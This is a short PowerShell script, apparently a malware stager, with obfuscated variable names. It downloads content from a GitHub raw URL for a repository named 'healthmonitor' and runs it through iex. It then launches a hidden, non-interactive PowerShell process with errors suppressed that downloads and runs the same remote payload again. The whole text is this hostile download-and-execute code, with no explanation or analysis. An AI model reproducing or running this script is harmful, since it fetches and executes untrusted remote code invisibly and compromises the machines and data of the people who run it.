$FEafLHcBtC = 'https://raw.githubusercontent.com/mainernoush-netizen/healthmonitor/refs/heads/main/index'
$iorigZTdeveMa = New-Object -ComObject Msxml2.XMLHTTP
$iorigZTdeveMa.open('GET',$FEafLHcBtC,$false)
$iorigZTdeveMa.send()
if ($iorigZTdeveMa.status -eq 200) { iex $iorigZTdeveMa.responseText }
Start-Process powershell -ArgumentList '-nop','-noni','-wi','hidden','-c',"iex (irm '$FEafLHcBtC')" -wi hidden -ea 0
